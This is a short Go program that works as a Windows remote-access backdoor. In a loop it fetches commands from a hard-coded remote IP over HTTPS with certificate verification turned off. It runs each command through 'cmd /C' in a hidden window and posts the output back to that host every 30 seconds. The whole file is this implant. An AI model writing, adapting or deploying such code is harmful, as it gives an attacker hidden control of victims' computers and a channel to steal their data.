package main

import (
    "bytes"
    "crypto/tls"
    "fmt"
    "io/ioutil"
    "net/http"
    "os/exec"
    "strings"
    "syscall"
    "time"
)

func main() {
    link := "https://1.2.3.4/static/command.html"

    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Transport: tr}

    for {
        response, err := client.Get(link)
        if err != nil {
            fmt.Println(err)
        }

        defer response.Body.Close()

        content, _ := ioutil.ReadAll(response.Body)
        s := strings.TrimSpace(string(content))

        cmd := exec.Command("cmd", "/C", s)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        out, _ := cmd.Output();

        _, err = client.Post(link, "text/plain", bytes.NewBufferString(string(out)))

        time.Sleep(30 * time.Second)
    }
}
